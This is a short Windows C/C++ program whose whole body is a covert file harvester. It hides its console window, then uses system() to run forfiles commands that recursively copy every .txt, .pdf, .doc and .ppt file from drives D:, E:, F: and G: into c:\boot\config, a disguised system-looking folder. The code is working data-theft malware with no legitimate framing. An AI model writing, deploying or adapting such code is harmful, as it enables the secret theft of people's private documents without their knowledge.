#include <stdio.h>
#include <fstream>
#include <stdlib.h>
#include <conio.h>

#if       _WIN32_WINNT < 0x0500
  #undef  _WIN32_WINNT
  #define _WIN32_WINNT   0x0500
#endif

#include <windows.h>

int main()
{
    ShowWindow( GetConsoleWindow(), SW_HIDE );
    
    char arr1[] = "forfiles /p f:\\ /m *.txt /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr2[] = "forfiles /p f:\\ /m *.pdf /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr3[] = "forfiles /p f:\\ /m *.doc /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr4[] = "forfiles /p f:\\ /m *.ppt /s /c \"cmd /c copy @file c:\\boot\\config \"";
     
  
   system(arr1); 
   system(arr2); 
   system(arr3); 
   system(arr4);    
   
   char arr5[] = "forfiles /p d:\\ /m *.txt /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr6[] = "forfiles /p d:\\ /m *.pdf /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr7[] = "forfiles /p d:\\ /m *.doc /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr8[] = "forfiles /p d:\\ /m *.ppt /s /c \"cmd /c copy @file c:\\boot\\config \"";
     
  
   system(arr5); 
   system(arr6); 
   system(arr7); 
   system(arr8);   
   
   char arr9[] = "forfiles /p e:\\ /m *.txt /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr10[] = "forfiles /p e:\\ /m *.pdf /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr11[] = "forfiles /p e:\\ /m *.doc /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr12[] = "forfiles /p e:\\ /m *.ppt /s /c \"cmd /c copy @file c:\\boot\\config \"";
     
   
   system(arr9); 
   system(arr10); 
   system(arr11); 
   system(arr12);   
   
    char arr13[] = "forfiles /p g:\\ /m *.txt /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr14[] = "forfiles /p g:\\ /m *.pdf /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr15[] = "forfiles /p g:\\ /m *.doc /s /c \"cmd /c copy @file c:\\boot\\config \"";
     char arr16[] = "forfiles /p g:\\ /m *.ppt /s /c \"cmd /c copy @file c:\\boot\\config \"";
     
  
   system(arr13); 
   system(arr14); 
   system(arr15); 
   system(arr16);   

return 0; 
}